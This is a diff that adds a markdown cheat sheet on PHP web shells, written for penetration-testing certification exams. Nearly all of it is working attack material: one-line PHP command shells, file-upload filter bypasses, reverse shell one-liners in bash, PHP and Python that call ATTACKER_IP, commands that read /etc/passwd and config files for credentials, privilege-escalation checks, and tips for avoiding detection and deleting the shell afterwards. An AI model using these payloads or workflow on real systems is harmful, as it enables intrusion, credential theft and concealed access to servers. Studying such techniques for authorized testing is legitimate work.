@@ -359,3 +359,343 @@ Privilege escalation
 
 ---
 
+# 🐘 PHP Web Shell Cheat Sheet
+
+### (Upload Bypass + Reverse Shell + Enumeration)
+
+HTB • CPTS • OSCP Focused
+
+---
+
+# 📁 1️⃣ Basic PHP Web Shells
+
+## 🔹 Minimal Command Shell (Exam Favorite)
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Access:
+
+```
+http://target/shell.php?cmd=whoami
+```
+
+---
+
+## 🔹 More Reliable Version
+
+```php
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+---
+
+## 🔹 POST-Based Shell (Stealthier)
+
+```php
+<?php system($_POST['cmd']); ?>
+```
+
+Use with Burp or curl.
+
+---
+
+# 📤 2️⃣ File Upload Bypass Techniques
+
+## 🎯 A. Extension Bypass
+
+|Technique|Example|
+|---|---|
+|Double extension|shell.php.jpg|
+|Mixed case|shell.PHp|
+|Alternate extension|shell.phtml|
+|PHP5 extension|shell.php5|
+|PHP7 extension|shell.php7|
+|Null byte (old systems)|shell.php%00.jpg|
+
+---
+
+## 🎯 B. Content-Type Bypass (Burp Suite)
+
+Intercept request:
+
+Original:
+
+```
+Content-Type: application/x-php
+```
+
+Change to:
+
+```
+Content-Type: image/gif
+```
+
+Forward request.
+
+✔ Bypasses client-side validation  
+✔ Bypasses weak server-side validation
+
+---
+
+## 🎯 C. Magic Bytes Bypass
+
+Add GIF header to PHP file:
+
+```php
+GIF89a
+<?php system($_GET['cmd']); ?>
+```
+
+Server thinks it's an image.
+
+---
+
+## 🎯 D. MIME Tampering via Burp
+
+Change:
+
+```
+Content-Type: image/jpeg
+```
+
+Even if file is `.php`
+
+---
+
+# 🌐 3️⃣ Find Upload Location
+
+Common locations:
+
+|Server|Path|
+|---|---|
+|Apache|/var/www/html|
+|Uploads|/var/www/html/uploads|
+|rConfig|/images/vendor/|
+|WordPress|/wp-content/uploads/|
+
+Check manually:
+
+```bash
+http://target/uploads/shell.php
+```
+
+---
+
+# 🖥️ 4️⃣ Initial Enumeration Commands
+
+Run immediately:
+
+```bash
+whoami
+```
+
+```bash
+id
+```
+
+```bash
+hostname
+```
+
+```bash
+pwd
+```
+
+```bash
+uname -a
+```
+
+```bash
+cat /etc/passwd
+```
+
+```bash
+ls -la
+```
+
+---
+
+# 📂 Webroot Enumeration
+
+```bash
+ls /var/www/html
+```
+
+```bash
+cat config.php
+```
+
+```bash
+cat wp-config.php
+```
+
+Look for:
+
+- DB credentials
+    
+- Hardcoded passwords
+    
+- API keys
+    
+
+---
+
+# 📡 5️⃣ Reverse Shell From PHP Web Shell
+
+---
+
+## 🔹 Start Listener
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## 🔹 Bash Reverse Shell
+
+Execute via browser:
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+---
+
+## 🔹 PHP Reverse Shell (One-Liner)
+
+```php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
+```
+
+---
+
+## 🔹 PHP Native Reverse Shell
+
+```php
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+---
+
+## 🔹 Python Reverse Shell
+
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+---
+
+# 🧰 6️⃣ Upgrade to Fully Interactive TTY
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Then:
+
+```bash
+export TERM=xterm
+```
+
+Then on attacker machine:
+
+```
+CTRL + Z
+stty raw -echo
+fg
+```
+
+---
+
+# 🔐 7️⃣ Privilege Escalation Checks
+
+```bash
+sudo -l
+```
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+```bash
+cat /etc/crontab
+```
+
+```bash
+ps aux
+```
+
+```bash
+env
+```
+
+---
+
+# 🧠 8️⃣ Stability & OPSEC Tips
+
+|Best Practice|Why|
+|---|---|
+|Upgrade to reverse shell|More stable|
+|Delete shell after use|Avoid detection|
+|Remove comments|Avoid signature detection|
+|Rename file|Avoid easy detection|
+|Log file hash|For reporting|
+
+Generate hash:
+
+```bash
+sha1sum shell.php
+```
+
+---
+
+# 🔥 9️⃣ Full Attack Workflow
+
+```
+Find upload vulnerability
+        ↓
+Upload PHP shell
+        ↓
+Bypass Content-Type restriction
+        ↓
+Navigate to shell
+        ↓
+Enumerate system
+        ↓
+Spawn reverse shell
+        ↓
+Upgrade to TTY
+        ↓
+Privilege escalation
+        ↓
+Delete web shell
+```
+
+---
+
+# 🏆 10️⃣ Most Important Commands (Memorize)
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+```bash
+nc -lvnp 4444
+```
+
+```bash
+bash -i >& /dev/tcp/IP/4444 0>&1
+```
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
+sudo -l
+```
+
+---
